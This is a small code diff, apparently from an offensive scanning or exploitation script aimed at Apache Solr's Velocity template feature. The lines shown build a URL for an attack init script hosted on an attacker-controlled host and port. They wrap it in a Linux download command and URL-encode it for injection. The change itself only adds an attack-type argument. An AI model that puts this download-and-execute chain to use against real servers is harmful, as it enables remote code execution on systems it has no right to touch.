@@ -90,7 +90,7 @@ openSolrVelocity := func(core) {
 makeCmd := func(){
 
     initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
-    initDownloadCmd := attackScript.initCmdForLinux(initUrl)
+    initDownloadCmd := attackScript.initCmdForLinux(initUrl,ApacheSolrAttackType)
     return http.urlEncode(initDownloadCmd)
 }
 
